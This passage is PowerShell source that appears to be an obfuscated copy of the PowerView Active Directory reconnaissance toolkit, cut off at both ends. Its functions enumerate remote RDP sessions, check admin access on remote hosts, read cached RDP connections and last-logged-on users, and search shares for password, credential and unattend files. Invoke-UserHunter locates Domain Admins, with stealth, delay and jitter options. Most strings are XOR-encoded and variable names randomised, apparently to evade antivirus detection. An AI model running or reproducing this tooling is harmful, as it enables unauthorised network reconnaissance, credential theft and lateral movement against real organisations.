        Write-Debug ((ParseEntry20 @(181,203,165,139,171,172,198,215,131,191,189,215,132,202,189,203,133,203,199,220,132,148,165,193,131,174,139,139,168,144,178,134) @(231,249,243,187)) + $NW6jRjlY)
        if (($NW6jRjlY -eq 0) -and ($Offset -gt 0)) {
            $dw2rvH = $BOJuX::GetSize()
            for ($h4S0 = 0; ($h4S0 -lt $oPmA); $h4S0++) {
                $KMRG7si = New-Object System.Intptr -ArgumentList $Offset
                $Lsy7 = $KMRG7si -as $BOJuX
                $Lsy7 | Select-Object *
                $Offset = $KMRG7si.ToInt64()
                $Offset += $dw2rvH
            }
            $Null = $aJIaD::NetApiBufferFree($kAB9)
        }
        else
        {
            switch ($NW6jRjlY) {
                (5)           {Write-Debug 'The user does not have access to the requested information.'}
                (124)         {Write-Debug 'The value specified for the level parameter is not valid.'}
                (87)          {Write-Debug 'The specified parameter is not valid.'}
                (234)         {Write-Debug 'More entries are available. Specify a large enough buffer to receive all entries.'}
                (8)           {Write-Debug 'Insufficient memory is available.'}
                (2312)        {Write-Debug 'A session does not exist with the computer name.'}
                (2351)        {Write-Debug 'The computer name is not valid.'}
                (2221)        {Write-Debug 'Username not found.'}
                (53)          {Write-Debug 'Hostname could not be found'}
            }
        }
    }
}
function Get-NetRDPSession {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost'
    )
    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }
    process {
        $ComputerName = Get-NameField -Object $ComputerName
        $liv8 = $uSJ2gRK::WTSOpenServerEx($ComputerName)
        if ($liv8 -ne 0) {
            Write-Debug ((ParseEntry20 @(90,255,21,164,219,248,93,14,110,162,9,156,236,165,69,14,111,165,17,196,198,140,119,10,110,163,21,131,213,159,112,5) @(12,206,71,240,143,203,31,98)) + $liv8)
            $pzGV = [IntPtr]::Zero
            $QVKhRZ7 = 0
            $NW6jRjlY = $uSJ2gRK::WTSEnumerateSessionsEx($liv8, [ref]1, 0, [ref]$pzGV, [ref]$QVKhRZ7)
            $Offset = $pzGV.ToInt64()
            Write-Debug ((ParseEntry20 @(241,45,41,209,181,213,76,22,197,75,45,252,190,218,43,75,242,46,45,255,132,176,21,81,197,114,53,195,130,193,59,94,253,68,53,180,133,202,40,17,238,93,70,184) @(167,28,123,133,231,130,121,39)) + $NW6jRjlY)
            Write-Debug ((ParseEntry20 @(33,217,237,122,33,26,229,114,211,202,77,120) @(66,156,163,12,69,77,208)) + $QVKhRZ7)
            if (($NW6jRjlY -ne 0) -and ($Offset -gt 0)) {
                $dw2rvH = $EOgY::GetSize()
                for ($h4S0 = 0; ($h4S0 -lt $QVKhRZ7); $h4S0++) {
                    $KMRG7si = New-Object System.Intptr -ArgumentList $Offset
                    $Lsy7 = $KMRG7si -as $EOgY
                    $j3wWX = New-Object PSObject
                    if ($Lsy7.pHostName) {
                        $j3wWX | Add-Member Noteproperty 'ComputerName' $Lsy7.pHostName
                    }
                    else {
                        $j3wWX | Add-Member Noteproperty 'ComputerName' $ComputerName
                    }
                    $j3wWX | Add-Member Noteproperty 'SessionName' $Lsy7.pSessionName
                    if ($(-not $Lsy7.pDomainName) -or ($Lsy7.pDomainName -eq '')) {
                        $j3wWX | Add-Member Noteproperty 'UserName' ($($Lsy7.pUserName))
                    }
                    else {
                        $j3wWX | Add-Member Noteproperty 'UserName' ($($Lsy7.pDomainName) + "\" + $($Lsy7.pUserName))
                    }
                    $j3wWX | Add-Member Noteproperty 'ID' $Lsy7.SessionID
                    $j3wWX | Add-Member Noteproperty 'State' $Lsy7.State
                    $Gflvk4 = [IntPtr]::Zero
                    $EiOxIl = 0
                    $bBRCVO2 = $uSJ2gRK::WTSQuerySessionInformation($liv8, $Lsy7.SessionID, 14, [ref]$Gflvk4, [ref]$EiOxIl)
                    $gZZQPd = $Gflvk4.ToInt64()
                    $hYA6j2 = New-Object System.Intptr -ArgumentList $gZZQPd
                    $Z5AHdX = $hYA6j2 -as $Ff07
                    $i8PCr = $Z5AHdX.Address       
                    if($i8PCr[2] -ne 0) {
                        $i8PCr = [String]$i8PCr[2]+"."+[String]$i8PCr[3]+"."+[String]$i8PCr[4]+"."+[String]$i8PCr[5]
                    }
                    else {
                        $i8PCr = $Null
                    }
                    $j3wWX | Add-Member Noteproperty 'SourceIP' $i8PCr
                    $j3wWX
                    $Null = $uSJ2gRK::WTSFreeMemory($Gflvk4)
                    $Offset += $dw2rvH
                }
                $Null = $uSJ2gRK::WTSFreeMemoryEx(2, $pzGV, $QVKhRZ7)
            }
            $Null = $uSJ2gRK::WTSCloseServer($liv8)
        }
        else {
            $orwQ = $H7dxZ::GetLastError()
            Write-Verbuse ((ParseEntry20 @(6,164,19,63,97,11,4,154,54,40,60,55,29,138,20,120) @(82,227,85,69,5,78)) + $orwQ)
        }
    }
}
function Invoke-CheckLocalAdminAccess {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        [Alias('HostName')]
        $ComputerName = 'localhost'
    )
    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
    }
    process {
        $ComputerName = Get-NameField -Object $ComputerName
        $liv8 = $sND5Za::OpenSCManagerW((([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFw="))) + $ComputerName), 'ServicesActive', 0xF003F)
        Write-Debug ((ParseEntry20 @(165,59,169,12,148,94,232,82,186,57,210,81,172,59,210,76,162,43,165,84,175,59,228,124,172,43,173,78,148,7,218,84,175,94,202,68,149,21,222,81,175,59,169,85,148,43,201,8,191,45,161,3) @(246,108,156,62)) + $liv8)
        if ($liv8 -ne 0) {
            $Null = $sND5Za::CloseServiceHandle($liv8)
            $True
        }
        else {
            $orwQ = $H7dxZ::GetLastError()
            Write-Debug ((ParseEntry20 @(188,126,16,173,242,114,155,69,105,202,222,47,181,126,107,237,196,7,214,67,124,200,232,2,181,110,20,239,242,43,169,67,124,173,198,58,140,80,103,210,201,24,161,25,119,199,218,57,141,26,108,169,217,1,210,20) @(239,41,37,159,144,64)) + $orwQ)
            $False
        }
    }
}
function Get-LastLoggedOn {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        [Alias('HostName')]        
        $ComputerName = "."
    )
    process {
        $ComputerName = Get-NameField -Object $ComputerName
        try {
            $GIhV = [WMIClass](([char]0x5c+[char]0x5c) + $ComputerName + (ParseEntry20 @(251,4,141,148,160,180,104,188,249,11,145,143,155,223,108,172,199,8,183,152,166,192,104,140,249,27,163,179,161,234,3,237) @(163,76,199,226,194,135,58,223)))
            $RHizZl = 2147483650
            $rRcQU = (ParseEntry20 @(116,116,131,246,188,72,69,6,239,218,188,109,117,19,214,219,137,99,24,62,216,131,176,62,121,2,222,193,136,99,115,50,222,130,164,109,112,119,236,200,137,99,119,49,222,247,176,98,66,42,244,193,136,60,20,39,235,233,188,62,64,3,236,196,142,73,77,46,227,233,184,126,67,118,143,210,190,73,24,42,216,131,223,88,114,21,135,140) @(33,68,186,177,234,14))
            $Value = (ParseEntry20 @(86,196,227,245,188,194,122,245,255,189,188,235,88,198,156,250,142,223,76,239,198,232,229,186) @(2,131,165,143,216,135))
            $GIhV.GetStringValue($RHizZl, $rRcQU, $Value).sValue
        }
        catch {
            Write-Warning ((ParseEntry20 @(122,189,109,33,100,129,125,60,78,169,18,60,100,131,18,50,119,147,30,53,79,169,72,34,78,169,125,49,79,247,121,41,100,140,97,41,119,246,71,63,73,140,97,112,100,131,18,48,100,133,22,120) @(45,196,43,69)) + $ComputerName + (ParseEntry20 @(71,59,209,205,205,245,58,36,247,217,194,197,104,63,197,240,246,250,69,98,240,240,252,197,105,21,255,236,205,245,115,103,218,217,162,212,111,17,209,242,245,207,77,59,241,217,193,201,71,53,174,163) @(11,82,147,158,151,162)))
            $Null
        }
    }
}
function Get-CachedRDPConnection {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName = (ParseEntry20 @(193,159,49,144,106,158,219,183,106,201,125,249) @(163,216,8,250,51,201)),
        [String]
        $RemoteUserName,
        [String]
        $RemotePassword
    )
    begin {
        if ($RemoteUserName -and $RemotePassword) {
            $Password = $RemotePassword | ConvertTo-SecureString -AsPlainText -Force
            $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)
        }
        $n478c = 2147483651
    }
    process {
        try {
            if($Credential) {
                $GIhV = Get-Wmiobject -List 'StdRegProv' -Namespace root\default -Computername $ComputerName -Credential $Credential -ErrorAction SilentlyContinue
            }
            else {
                $GIhV = Get-Wmiobject -List 'StdRegProv' -Namespace root\default -Computername $ComputerName -ErrorAction SilentlyContinue
            }
        }
        catch {
            Write-Warning ((ParseEntry20 @(71,72,160,32,126,10,148,114,73,189,23,118,99,133,91,106,139,14,41,87,148,84,45,215) @(21,16,234,89,28,57,221)) + $ComputerName + (ParseEntry20 @(186,102,74,231,137,161,81,100,246,160,157,66,105,195,221,140,65,95,206,133,151,114,70,228,178,161,16,56,221,160,180,73,107,249,217,134,70,59,218,152,148,23,61,238,161,177,28,113,221,175,172,85,107,249,190,197,124,95,236,155,191,109,66,165,138,177,115,114,221,175,207,80,65,211,128,128,70,59,197,213) @(246,37,8,148,232)))
        }
        if(!$GIhV) {
            Write-Warning ((ParseEntry20 @(132,168,107,97,36,149,159,151,120,79,8,204,140,168,111,98,39,241,227,158,104,89,123,155) @(214,240,33,24,70,166)) + $ComputerName + (ParseEntry20 @(255,117,81,203,8,138,119,223,84,91,211,14,188,84,134,76,119,239,51,176,98,228,120,99,226,62,232,51,250,126,81,212,10,176,50,195,85,32,246,25,191,49,134,76,90,255,80,164,74,244,108,99,219,4,139,48,234,97,107,203,32,149,73,130,84,84,238,19,148,68,138,67,90,255,1,171,96,128,103,46) @(179,54,19,184,105,221,3)))
        }
        else {
            $WFhE = ($GIhV.EnumKey($n478c, "")).sNames | ? { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }
            foreach ($YniZ1ZYN in $WFhE) {
                try {
                    $UserName = Convert-SidToName $YniZ1ZYN
                    $fdEG = $GIhV.EnumValues($n478c,($YniZ1ZYN + (ParseEntry20 @(23,214,225,187,34,32,29,163,246,149,50,34,23,213,158,189,33,125,5,230,204,255,65,35,43,214,215,152,34,22,5,228,206,154,77,38,45,211,237,153,34,22,5,162,245,149,49,41,30,162,215,189,34,25,122,160,247,136,42,34,21,253,233,252,26,6,30,173) @(79,144,175,205,120,78)))).sNames
                    foreach ($eEUqUQz in $fdEG) {
                        if($eEUqUQz -match 'MRU.*') {
                            $TargetServer = $GIhV.GetStringValue($n478c, ($YniZ1ZYN + (ParseEntry20 @(8,159,190,76,175,62,139,195,99,173,26,181,168,127,196,32,128,195,112,131,51,235,201,87,145,22,161,165,96,173,26,173,145,109,192,56,187,179,120,161,10,129,186,8,175,8,144,151,107,199,40,169,170,109,192,96,129,181,104,153,10,180,182,11,151,24,136,205) @(80,217,240,58,245))), $eEUqUQz).sValue
                            $a9MFpM = New-Object PSObject
                            $a9MFpM | Add-Member Noteproperty 'ComputerName' $ComputerName
                            $a9MFpM | Add-Member Noteproperty 'UserName' $UserName
                            $a9MFpM | Add-Member Noteproperty 'UserSID' $YniZ1ZYN
                            $a9MFpM | Add-Member Noteproperty 'TargetServer' $TargetServer
                            $a9MFpM | Add-Member Noteproperty 'UsernameHint' $Null
                            $a9MFpM
                        }
                    }
                    $Iwk6n = $GIhV.EnumKey($n478c,($YniZ1ZYN + (ParseEntry20 @(7,171,48,88,5,131,44,29,6,181,52,66,7,168,79,94,6,222,52,88,60,223,71,67,59,171,6,123,5,181,52,90,62,186,75,70,61,174,60,122,5,181,52,28,5,181,55,73,14,223,6,94,5,186,75,30,7,171,48,66,60,131,36,66,60,131,51,19) @(95,237,126,46)))).sNames
                    foreach ($aXOOQM in $Iwk6n) {
                        $Z0D6J = $GIhV.GetStringValue($n478c, ($YniZ1ZYN + (ParseEntry20 @(105,49,241,28,231,115,220,2,46,231,32,209,69,203,0,7,230,89,247,107,237,3,78,210,14,251,101,219,107,47,245,30,220,74,187,89,21,252,40,233,71,214,123,69,229,50,244,122,223,3,15,207,48,234,40,190,105,49,241,6,222,115,212,93,20,209,36,222) @(49,119,191,106,189,29,142)) + $aXOOQM), 'UsernameHint').sValue
                        $a9MFpM = New-Object PSObject
                        $a9MFpM | Add-Member Noteproperty 'ComputerName' $ComputerName
                        $a9MFpM | Add-Member Noteproperty 'UserName' $UserName
                        $a9MFpM | Add-Member Noteproperty 'UserSID' $YniZ1ZYN
                        $a9MFpM | Add-Member Noteproperty 'TargetServer' $aXOOQM
                        $a9MFpM | Add-Member Noteproperty 'UsernameHint' $Z0D6J
                        $a9MFpM   
                    }
                }
                catch {
                    Write-Debug ((ParseEntry20 @(31,156,143,37,47,247,140,106,4,133,248,97) @(77,196,197,92)) + $_)
                }
            }
        }
    }
}
function Get-NetProcess {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $ComputerName,
        [String]
        $RemoteUserName,
        [String]
        $RemotePassword
    )
    process {
        if($ComputerName) {
            $ComputerName = Get-NameField -Object $ComputerName          
        }
        else {
            $ComputerName = [System.Net.Dns]::GetHostName()
        }
        $Credential = $Null
        if($RemoteUserName) {
            if($RemotePassword) {
                $Password = $RemotePassword | ConvertTo-SecureString -AsPlainText -Force
                $Credential = New-Object System.Management.Automation.PSCredential($RemoteUserName,$Password)
                try {
                    Get-WMIobject -Class Win32_process -ComputerName $ComputerName -Credential $Credential | ForEach-Object {
                        $fSHbo = $_.getowner();
                        $Process = New-Object PSObject
                        $Process | Add-Member Noteproperty 'ComputerName' $ComputerName
                        $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                        $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                        $Process | Add-Member Noteproperty 'Domain' $fSHbo.Domain
                        $Process | Add-Member Noteproperty 'User' $fSHbo.User
                        $Process
                    }
                }
                catch {
                    Write-Verbose ((ParseEntry20 @(233,236,144,40,247,203,232,236,181,33,135,247,247,210,128,57,218,217,143,249,181,33,248,190,223,194,227,34,247,198,244,249,180,27,135,190,228,198,148,59,221,227,135,255,140,20,240,244,228,205,155,63,247,201,248,255,143,126,232,244,221,236,148,63,223,217,202,249,180,4,213,233,228,210,128,57,223,217,232,254,153,37,255,179) @(190,149,214,76,190,142)) + $_)
                }
            }
            else {
                Write-Warning (ParseEntry20 @(224,187,51,30,142,175,253,174,23,45,254,217,237,148,55,18,164,218,249,241,23,73,141,130,254,133,68,75,164,218,230,165,44,45,191,147,213,187,55,19,157,186,245,184,17,34,133,158,213,133,25,22,157,170,242,255) @(183,194,117,122,199,233))
            }
        }
        else {
            try {
                Get-WMIobject -Class Win32_process -ComputerName $ComputerName | ForEach-Object {
                    $fSHbo = $_.getowner();
                    $Process = New-Object PSObject
                    $Process | Add-Member Noteproperty 'ComputerName' $ComputerName
                    $Process | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $Process | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $Process | Add-Member Noteproperty 'Domain' $fSHbo.Domain
                    $Process | Add-Member Noteproperty 'User' $fSHbo.User
                    $Process
                }
            }
            catch {
                Write-Verbose ((ParseEntry20 @(44,37,71,194,156,159,71,242,24,49,56,223,156,157,71,254,31,11,48,202,182,183,87,187,26,11,52,200,156,146,91,231,25,11,56,150,143,137,83,252,24,49,56,204,143,130,95,241,33,4,76,213,156,157,87,225,34,110,87,220,182,163,83,248,26,11,117,202,183,146,122,236,33,27,87,211,180,141,71,224,52,53,64,155) @(123,92,1,166,213,218,17,139)) + $_)
            }
        }
    }
}
function Find-InterestingFile {
    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Path = '.\',
        [String[]]
        $Terms,
        [Switch]
        $OfficeDocs,
        [Switch]
        $FreshEXEs,
        [String]
        $LastAccessTime,
        [String]
        $LastWriteTime,
        [String]
        $CreationTime,
        [Switch]
        $ExcludeFolders,
        [Switch]
        $ExcludeHidden,
        [Switch]
        $CheckWriteAccess,
        [String]
        $OutFile,
        [Switch]
        $UsePSDrive,
        [System.Management.Automation.PSCredential]
        $Credential = [System.Management.Automation.PSCredential]::Empty
    )
    begin {
        $VrCC = @('pass', 'sensitive', 'admin', 'login', 'secret', 'unattend*.xml', '.vmdk', 'creds', 'credential', '.config')
        if(!$Path.EndsWith('\')) {
            $Path = $Path + '\'
        }
        if($Credential -ne [System.Management.Automation.PSCredential]::Empty) { $UsePSDrive = $True }
        if ($Terms) {
            if($Terms -isnot [system.array]) {
                $Terms = @($Terms)
            }
            $VrCC = $Terms
        }
        if(-not $VrCC[0].startswith("*")) {
            for ($h4S0 = 0; $h4S0 -lt $VrCC.Count; $h4S0++) {
                $VrCC[$h4S0] = ("*" + $($VrCC[$h4S0]) + "*")
            }
        }
        if ($OfficeDocs) {
            $VrCC = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        if($FreshEXEs) {
            $LastAccessTime = (get-date).AddDays(-7).ToString('MM/dd/yyyy')
            $VrCC = '*.exe'
        }
        if($UsePSDrive) {
            $A6w2GNY = $Path.split('\')
            $RGUSl5I = $A6w2GNY[0..($A6w2GNY.length-2)] -join '\'
            $FilePath = $A6w2GNY[-1]
            $Qh217c4 = ((ParseEntry20 @(190,192,198,231,189,208,218,224,189,165,228,253,134,250,248,254,133,192,185,251,132,223,202,244,132,164,222,188,131,249,232,185,130,207,227,176) @(231,151,140,141)).ToCharArray() | Get-Random -Count 7) -join ''
            Write-Verbose ((ParseEntry20 @(147,174,246,187,17,160,139,183,155,162,233,20,173,158,129,201,174,201,50,243) @(199,249,207,138,115,206,217)) + $Path + (ParseEntry20 @(158,235,4,46,127,127,36,185,234,21,17,121,76,86,129,215,49,23,92,121,68,231,241,43,53,70,114,125,158,228,20,100,87,105,44,234) @(215,163,82,84,30,40,17)) + $Qh217c4)
            try {
                $Null = New-PSDrive -Name $Qh217c4 -Credential $Credential -PSProvider FileSystem -Root $RGUSl5I -ErrorAction Stop
            }
            catch {
                Write-Debug ((ParseEntry20 @(35,1,237,172,161,149,56,62,197,130,250,151,19,55,245,165,161,203,18,62,196,146,133,150,16,26,230,232) @(113,89,167,213,195,166)) + $Path + (ParseEntry20 @(71,215,238,217) @(14,147,129,190)) + $_)
                return $Null
            }
            $Path = $Qh217c4 + ([char]0x3a+[char]0x5c) + $FilePath
        }
    }
    process {
        Write-Verbose ((ParseEntry20 @(40,67,94,235,158,57,116,66,214,143,53,80,79,204,149,8,99,118,221,184,54,123,19,178) @(127,58,46,143,215)) + $Path)
        function Invoke-CheckWrite {
            [CmdletBinding()]param([String]$Path)
            try {
                $tEkOn = [IO.FILE]::OpenWrite($Path)
                $tEkOn.Close()
                $True
            }
            catch {
                Write-Verbose -Message $Error[0]
                $False
            }
        }
        $BJnRkp =  @{
            'Path' = $Path
            'Recurse' = $True
            'Force' = $(-not $ExcludeHidden)
            'Include' = $VrCC
            'ErrorAction' = 'SilentlyContinue'
        }
        Get-ChildItem @BJnRkp | ForEach-Object {
            Write-Verbose $_
            if(!$ExcludeFolders -or !$_.PSIsContainer) {$_}
        } | ForEach-Object {
            if($LastAccessTime -or $LastWriteTime -or $CreationTime) {
                if($LastAccessTime -and ($_.LastAccessTime -gt $LastAccessTime)) {$_}
                elseif($LastWriteTime -and ($_.LastWriteTime -gt $LastWriteTime)) {$_}
                elseif($CreationTime -and ($_.CreationTime -gt $CreationTime)) {$_}
            }
            else {$_}
        } | ForEach-Object {
            if((-not $CheckWriteAccess) -or (Invoke-CheckWrite -Path $_.FullName)) {$_}
        } | Select-Object FullName,@{Name='Owner';Expression={(Get-Acl $_.FullName).Owner}},LastAccessTime,LastWriteTime,CreationTime,Length | ForEach-Object {
            if($OutFile) {Export-PowerViewCSV -InputObject $_ -OutFile $OutFile}
            else {$_}
        }
    }
    end {
        if($UsePSDrive -and $Qh217c4) {
            Write-Verbose ((ParseEntry20 @(141,111,249,217,181,235,88,223,207,186,187,101,203,234,129,172,97,236,239,134,141,50,253,212,182,128,88,195,228,150,229,63) @(216,2,175,173,215)) + $Qh217c4)
            Get-PSDrive -Name $Qh217c4 -ErrorAction SilentlyContinue | Remove-PSDrive
        }
    }
}
function Invoke-ThreadedFunction {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,Mandatory=$True)]
        [String[]]
        $ComputerName,
        [Parameter(Position=1,Mandatory=$True)]
        [System.Management.Automation.ScriptBlock]
        $ScriptBlock,
        [Parameter(Position=2)]
        [Hashtable]
        $ScriptParameters,
        [Int]
        $Threads = 20,
        [Switch]
        $NoImports
    )
    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
        Write-Verbose ((ParseEntry20 @(135,124,70,57,140,150,87,64,57,130,150,118,127,26,240,225,103,97,23,169,179,108,116,43,159,185,71,89,63,246,158,53,85,39,170,183) @(208,5,54,93,197)) + $($ComputerName.count))
        $gabxQFb = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()
        $gabxQFb.ApartmentState = [System.Threading.Thread]::CurrentThread.GetApartmentState()
        if(!$NoImports) {
            $cdJXup = Get-Variable -Scope 2
            $fdZWU = @("?",(ParseEntry20 @(144,211,220,129,182,96,39,120) @(201,139,150,239,213,23,26,69)),(ParseEntry20 @(73,88,109,236,123,88,109,234,66,63,14,233,122,45,2,214,65,61,101,245) @(24,106,84,153)),(ParseEntry20 @(226,49,17,187,178,29,165,141) @(176,105,91,194,208,46,236)),(ParseEntry20 @(58,190,170,253,28,234,172,88,135,149,168,48,136,200,81,147,166,214,19,237,158,41,219,255) @(104,230,194,145,69,217,250)),(ParseEntry20 @(210,130,218,239,206,186,186,161) @(136,239,156,156,173)),(ParseEntry20 @(118,73,42,56,133,123,77,24) @(37,12,19,118,215,42,112)),(ParseEntry20 @(117,38,203,108,55,162,27,92) @(38,97,242,22,83,227)),(ParseEntry20 @(56,107,246,10,152,1,109,254) @(89,60,195,125,252)),(ParseEntry20 @(18,112,13,130,49,39,169,17,126,85,133,57,38,200,16,26) @(65,39,56,245,85,127,251)),(ParseEntry20 @(206,141,36,68,231,55,154,171,184,55,54,245,1,252,220,160,51,66,191,81,201,244,139,95) @(154,218,98,112,134,96,171)),(ParseEntry20 @(139,234,18,96,190,234,101,101,189,232,6,45,190,229,14,56,142,143,109,101,189,211,5,105) @(223,189,84,84)),(ParseEntry20 @(149,3,61,231,40,223,144,240,54,46,133,48,235,204,248,45,42,225,112,185,195,175,5,70) @(193,84,123,211,73,136,161)),(ParseEntry20 @(194,35,152,197,247,35,239,192,244,33,132,192,244,25,144,193,247,35,231,132,199,70,231,192,244,26,143,204) @(150,116,222,241)),(ParseEntry20 @(209,59,233,210,228,59,158,215,231,57,199,150,230,95,253,144,230,2,195,162,231,95,249,147,225,45,146,219) @(133,108,175,230)),(ParseEntry20 @(207,60,90,62,250,60,45,59,249,61,70,98,248,6,112,98,194,6,100,102,202,89,37,59,249,5,77,55) @(155,107,28,10)),(ParseEntry20 @(35,144,209,121,20,160,167,86,46,250,251,3,23,153,196,85) @(119,200,189,51,118,206,253,32)),(ParseEntry20 @(11,106,142,85,4,86,70,146) @(105,4,216,38,102,23,123,175)),(ParseEntry20 @(214,90,106,189) @(131,31,6,248,78,242,214,46)),(ParseEntry20 @(178,191,187,22,124,212,175,128,15,88,165,145,150,56,88,147,163,173,7,114,132,151,184,104) @(231,249,245,85,30)),(ParseEntry20 @(161,57,104,91,161,1,197,11,127,72,246,88,161,56,96,47,162,114,201,66) @(244,127,38,31,195,51)),(ParseEntry20 @(31,240,94,53,152,159,241,239,46,238,90,29) @(74,182,16,113,252,200,137,223)),(ParseEntry20 @(150,178,32,123,117,208,162,171,144,57,70,31,210,191,133,141,55,105,30,235,156,132,162,23,104,66,193,139,167,163,56,68) @(195,244,110,62,47,135,248)),(ParseEntry20 @(70,76,103,218,111,33,109,229) @(19,10,41,147,59,17,92,163)),(ParseEntry20 @(46,1,65,38,34,116,69,2,24,15,93,33,25,117,54,66) @(123,71,15,114)),(ParseEntry20 @(36,169,120,242,218,23,8,83,19,167,100,149,234,47,19,95) @(113,239,54,164,137,66,70,98)),(ParseEntry20 @(90,48,209,116,85,46,213,89,110,33,166,86,89,49,217,74,109,49,202,30) @(15,118,159,35)),(ParseEntry20 @(135,144,23,139) @(210,214,115,206,37,207)),(ParseEntry20 @(198,60,176,36,27,222,235,68,130,9,68,164) @(147,14,216,72,121,153)),(ParseEntry20 @(228,163,39,114,60,151,217,233,41,53,80,213,212,253,29,108,54,226,247,234,42,70,88,152) @(177,144,75,7,101,165)),(ParseEntry20 @(19,31,45,38,175,38,106,90) @(119,87,103,23,245)))
            ForEach($g5RBtR in $cdJXup) {
                if($fdZWU -NotContains $g5RBtR.Name) {
                $gabxQFb.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $g5RBtR.name,$g5RBtR.Value,$g5RBtR.description,$g5RBtR.options,$g5RBtR.attributes))
                }
            }
            ForEach($ISXuen in (Get-ChildItem Function:)) {
                $gabxQFb.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $ISXuen.Name, $ISXuen.Definition))
            }
        }
        $LCF6 = [runspacefactory]::CreateRunspacePool(1, $Threads, $gabxQFb, $Host)
        $LCF6.Open()
        $kcx2dbQ = @()
        $PS = @()
        $hzxpNZx2 = @()
        $o6bG = 0
    }
    process {
        ForEach ($mnZ6k in $ComputerName) {
            if ($mnZ6k -ne '') {
                While ($($LCF6.GetAvailableRunspaces()) -le 0) {
                    Start-Sleep -MilliSeconds 500
                }
                $PS += [powershell]::create()
                $PS[$o6bG].runspacepool = $LCF6
                $Null = $PS[$o6bG].AddScript($ScriptBlock).AddParameter('ComputerName', $mnZ6k)
                if($ScriptParameters) {
                    ForEach ($BZX4S9b in $ScriptParameters.GetEnumerator()) {
                        $Null = $PS[$o6bG].AddParameter($BZX4S9b.Name, $BZX4S9b.Value)
                    }
                }
                $kcx2dbQ += $PS[$o6bG].BeginInvoke();
                $hzxpNZx2 += $kcx2dbQ[$o6bG].AsyncWaitHandle
            }
            $o6bG = $o6bG + 1
        }
    }
    end {
        Write-Verbose (ParseEntry20 @(220,70,144,111,114,205,24,163,69,111,200,25,180,44,95,237,23,228,81,126,232,25,227,111,116,231,23,177,123,81,226,13,140,72,80,225,23,175,93,38,232,13,148,114,119,221,65,166,124,36,237,1,154,118,34,183) @(138,116,214,31,22))
        $T7rY = Get-Date
        while ($($kcx2dbQ | Where-Object {$_.IsCompleted -eq $False}).count -gt 0 -or $($($(Get-Date) - $T7rY).totalSeconds) -gt 60) {
                Start-Sleep -MilliSeconds 500
            }
        for ($e07uf = 0; $e07uf -lt $o6bG; $e07uf++) {
            try {
                $PS[$e07uf].EndInvoke($kcx2dbQ[$e07uf])
            } catch {
                Write-Warning ((ParseEntry20 @(74,198,182,40,69,250,132,38,215,189,108,26) @(16,158,252,81,39,201,205)) + $_)
            }
            finally {
                $PS[$e07uf].Dispose()
            }
        }
        $LCF6.Dispose()
        Write-Verbose (ParseEntry20 @(63,214,199,84,178,107,68,238,13,236,233,79,161,107,91,230,55,179,134,83,152,100,110,237,10,198,233,76,178,114,43,188) @(110,129,191,39,251,35,22,129))
    }
}
function Invoke-UserHunter {
    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('Hosts')]
        [String[]]
        $ComputerName,
        [ValidateScript({Test-Path -Path $_ })]
        [Alias('HostList')]
        [String]
        $ComputerFile,
        [String]
        $ComputerFilter,
        [String]
        $ComputerADSpath,
        [Switch]
        $Unconstrained,
        [String]
        $GroupName = 'Domain Admins',
        [String]
        $TargetServer,
        [String]
        $UserName,
        [String]
        $UserFilter,
        [String]
        $UserADSpath,
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $UserFile,
        [Switch]
        $AdminCount,
        [Switch]
        $AllowDelegation,
        [Switch]
        $CheckAccess,
        [Switch]
        $StopOnSuccess,
        [Switch]
        $NoPing,
        [UInt32]
        $Delay = 0,
        [Double]
        $Jitter = .3,
        [String]
        $Domain,
        [String]
        $DomainController,
        [Switch]
        $ShowAll,
        [Switch]
        $SearchForest,
        [Switch]
        $Stealth,
        [String]
        [ValidateSet((ParseEntry20 @(119,184,40,225) @(37,253,114,181,121,191)),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM="))),(ParseEntry20 @(156,173,139,27,184,159,253,218) @(206,192,231,104,226)),(ParseEntry20 @(58,13,229,131) @(107,90,157,240,98,191)))]
        $StealthSource =(ParseEntry20 @(193,157,47,151) @(144,202,87,228,195,141)),
        [Switch]
        $ForeignUsers,
        [ValidateRange(1,100)] 
        [Int]
        $Threads
    )
    begin {
        if ($PSBoundParameters['Debug']) {
            $DebugPreference = 'Continue'
        }
        $BiHWqPVB = New-Object System.Random
        Write-Verbose ((ParseEntry20 @(136,108,218,15,150,83,224,90,189,120,159,27,189,120,201,12,140,66,159,89,189,39,222,7,147,67,252,17,133,77,224,34,187,66,159,91,133,77,227,12,187,39,198,91,190,86,232,0,133,66,210,3,186,70,232,29,133,124,235,86) @(223,21,170,107)) + $Delay)
        if($Domain) {
            $k8fkcV = @($Domain)
        }
        elseif($SearchForest) {
            $k8fkcV = Get-NetForestDomain | ForEach-Object { $_.Name }
        }
        else {
            $k8fkcV = @( (Get-NetDomain).name )
        }
        if(!$ComputerName) { 
            [Array]$ComputerName = @()
            if($ComputerFile) {
